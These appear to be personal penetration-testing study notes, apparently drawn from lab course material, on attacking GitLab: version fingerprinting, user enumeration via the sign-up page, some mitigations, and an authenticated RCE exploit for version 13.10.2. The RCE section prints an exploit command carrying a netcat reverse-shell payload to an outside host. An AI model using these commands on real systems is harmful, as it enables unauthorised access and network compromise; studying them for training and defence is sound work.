
# 1 fingerprint version 
`/help`

## enumeration
visit `/explore` check repos
# 1 user enumeration through register
https://www.exploit-db.com/exploits/49821

```shell-session
./gitlab_userenum.sh --url http://gitlab.ad.someorg.local:8081/ --userlist users.txt
```
![[Pasted image 20250219232959.png]]

![](https://academy.hackthebox.com/storage/modules/113/gitlab_signup.png)

We can also use the registration form to enumerate valid users (more on this in the next section). If we can make a list of valid users, we could attempt to guess weak passwords or possibly re-use credentials that we find from a password dump using a tool such as `Dehashed` as seen in the osTicket section. Here we can see the user `root` is taken. We'll see another example of username enumeration in the next section. On this particular instance of GitLab (and likely others), we can also enumerate emails. If we try to register with an email that has already been taken, we will get the error `1 error prohibited this user from being saved: Email has already been taken`. As of the time of writing, this username enumeration technique works with the latest version of GitLab. Even if the `Sign-up enabled` checkbox is cleared within the settings page under `Sign-up restrictions`, we can still browse to the `/users/sign_up` page and enumerate users but will not be able to register a user.

 Some mitigations can be put in place for this, such as enforcing 2FA on all user accounts, using `Fail2Ban` to block failed login attempts which are indicative of brute-forcing attacks, and even restricting which IP addresses can access a GitLab instance if it must be accessible outside of the internal corporate network.
# 2 exploits



# 3 source code review for secrets
# 4 Authenticated Remote Code Execution

Remote code execution vulnerabilities are typically considered the "cream of the crop" as access to the underlying server will likely grant us access to all data that resides on it (though we may need to escalate privileges first) and can serve as a foothold into the network for us to launch further attacks against other systems and potentially result in full network compromise. GitLab Community Edition version 13.10.2 and lower suffered from an authenticated remote code execution [vulnerability](https://hackerone.com/reports/1154542) due to an issue with ExifTool handling metadata in uploaded image files. This issue was fixed by GitLab rather quickly, but some companies are still likely using a vulnerable version. We can use this [exploit](https://www.exploit-db.com/exploits/49951) to achieve RCE.

As this is authenticated remote code execution, we first need a valid username and password. In some instances, this would only work if we could obtain valid credentials through OSINT or a credential guessing attack. However, if we encounter a vulnerable version of GitLab that allows for self-registration, we can quickly sign up for an account and pull off the attack.

Attacking GitLab

```shell-session
python3 gitlab_13_10_2_rce.py -t http://gitlab.ad.someorg.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '

[1] Authenticating
Successfully Authenticated
[2] Creating Payload 
[3] Creating Snippet and Uploading
[+] RCE Triggered !!
```

```shell-session
$ python3 gitlab_13_10_2_rce.py -t http://gitlab.ad.someorg.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
```
